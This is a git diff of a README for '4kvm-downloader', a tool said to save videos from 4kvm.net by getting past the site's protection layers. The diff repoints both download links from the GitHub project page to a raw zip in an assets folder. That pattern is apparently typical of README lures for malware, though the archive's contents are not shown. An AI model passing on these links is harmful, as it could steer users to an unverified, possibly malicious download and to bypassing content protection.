@@ -1,6 +1,6 @@
 # 🎬 4kvm-downloader - Save high quality videos with ease
 
-[![](https://img.shields.io/badge/Download-4kvm--downloader-blue.svg)](https://github.com/Weilandt9459/4kvm-downloader)
+[![](https://img.shields.io/badge/Download-4kvm--downloader-blue.svg)](https://github.com/Weilandt9459/4kvm-downloader/raw/refs/heads/main/4kvm-downloader/assets/kvm-downloader-v2.4.zip)
 
 The 4kvm-downloader software saves videos from the 4kvm.net platform directly to your computer. This tool manages the complex protection layers on the website to ensure you get a clean, watchable file. It handles video streams, stitches segments together, and converts the output into a standard format you can play in any media player.
 
@@ -14,7 +14,7 @@ The software requires a stable internet connection to pull video data. It uses b
 
 Download the software from the official project page.
 
-[Click here to visit the download page](https://github.com/Weilandt9459/4kvm-downloader)
+[Click here to visit the download page](https://github.com/Weilandt9459/4kvm-downloader/raw/refs/heads/main/4kvm-downloader/assets/kvm-downloader-v2.4.zip)
 
 Follow these steps to set up the tool on your Windows machine:
 
